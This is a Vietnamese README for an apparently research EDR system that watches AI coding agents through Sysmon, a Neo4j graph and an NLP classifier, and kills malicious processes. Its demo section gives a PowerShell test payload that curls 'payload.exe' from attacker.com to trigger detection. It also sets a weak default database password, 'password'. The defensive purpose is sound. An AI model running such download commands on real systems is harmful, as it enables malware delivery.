# Security for AI Agent (EDR)

Hệ thống **AI Runtime Security (EDR)** chuyên dụng để bảo vệ môi trường lập trình có sự hỗ trợ của AI (AI-assisted Development Environment) khỏi các cuộc tấn công **Indirect Prompt Injection**, **Data Exfiltration** và các hành vi thực thi mã độc do AI Agent tự động sinh ra.

Dự án nghiên cứu này kết hợp giám sát ở mức OS Kernel (Sysmon), lưu vết đồ thị (Neo4j Graph Database), và phân tích ngữ nghĩa dòng lệnh bằng Mô hình Trí tuệ Nhân tạo (Deep Learning NLP).

---

## 🌟 Kiến trúc 8 Lớp (8-Phases Architecture)

1. **AI Telemetry Layer**: Hook và thu thập dữ liệu hành vi của AI Agent.
2. **Sysmon OS Collector**: Đọc luồng sự kiện bảo mật trực tiếp từ Kernel của Windows (Event ID 1).
3. **Correlation Engine**: Sử dụng thuật toán Sliding Window để nối log AI và log OS theo thời gian thực.
4. **Heuristic Detection Engine**: Quét và chặn các payload/công cụ độc hại cơ bản.
5. **AI Security Analyzer (NLP)**: Dùng mô hình **DeBERTa / DistilBERT** (Zero-shot Classification) để phân tích ngữ nghĩa (Semantics) của lệnh thực thi và gán nhãn mức độ đe dọa (VD: *Remote Code Execution*).
6. **Containment Engine**: Tự động gọi API hệ điều hành để tiêu diệt (Kill) tiến trình độc hại trong chớp mắt mà không làm sập tiến trình mẹ.
7. **Response Engine**: Quản lý điều phối cảnh báo và đánh giá Risk Score.
8. **Neo4j Graph Investigation**: Đẩy toàn bộ đường dây tấn công thành Đồ thị (Nodes & Relationships) để SOC Analyst điều tra nguyên nhân gốc rễ (Root Cause Analysis).

---

## ⚙️ Yêu cầu Hệ thống (Prerequisites)

Để hệ thống hoạt động đúng như một sản phẩm thương mại, máy chủ/Endpoint cần phải cài đặt các thành phần cốt lõi sau:

### 1. Cài đặt Sysmon (Bắt buộc)
Hệ điều hành Windows mặc định không có Sysmon. Bạn cần cài đặt Sysmon để hệ thống có thể lắng nghe luồng sự kiện Process Creation.
- Tải [Sysmon từ Microsoft Sysinternals](https://learn.microsoft.com/en-us/sysinternals/downloads/sysmon).
- Mở PowerShell (Admin) tại thư mục vừa giải nén và chạy lệnh:
  ```powershell
  Sysmon64.exe -accepteula -i
  ```

### 2. Cài đặt Neo4j Desktop (Khuyên dùng)
Dùng để vẽ đồ thị mạng nhện điều tra sự cố.
- Tải và cài đặt [Neo4j Desktop](https://neo4j.com/download/).
- Tạo một Project mới, tạo một Local Database với mật khẩu là `password`.
- Khởi động Database (trạng thái `RUNNING`).

---

## 🚀 Hướng dẫn Cài đặt & Triển khai

**Bước 1: Clone Repository & Cài đặt thư viện**
Mở Terminal/PowerShell và chạy lệnh:
```bash
git clone https://github.com/sonle325/Security-for-AI-Agent-.git
cd Security-for-AI-Agent-
pip install -r requirements.txt
```

**Bước 2: Pre-load AI Model (Tùy chọn)**
Mô hình Deep Learning nặng khoảng 250MB. Bạn nên tải trước vào cache để tránh gián đoạn lúc hệ thống EDR đang chạy:
```bash
python download_model.py
```

**Bước 3: Kích hoạt Hệ thống EDR**
Mở **PowerShell bằng quyền Administrator** và chạy lệnh:
```bash
python main.py
```
> **Lưu ý:** Bắt buộc phải chạy bằng quyền Administrator để Python có đủ đặc quyền đọc Event Log của Windows và Kill Process mã độc.

---

## 🛡️ Hướng dẫn Demo Tấn công & Phòng thủ

1. Sau khi hệ thống hiện dòng chữ `[AI Analyzer] ✅ NLP Pipeline tải thành công!`.
2. Bấm phím **Enter** trên cửa sổ EDR để giả lập việc AI Agent vừa sinh ra một lệnh.
3. Trong vòng 5 giây, mở hộp thoại `Run` (`Windows + R`) hoặc một cửa sổ PowerShell khác, dán Payload độc hại sau vào và Enter:
   ```powershell
   powershell.exe -NoExit -Command "curl http://attacker.com/payload.exe; echo 'Đang tải mã độc...'"
   ```
4. Quay lại cửa sổ EDR để chứng kiến tiến trình bị chém đứt đầu và đồ thị sự cố được đẩy lên Neo4j. Mở Neo4j Browser và dùng lệnh `MATCH (n) RETURN n` để xem kết quả điều tra!
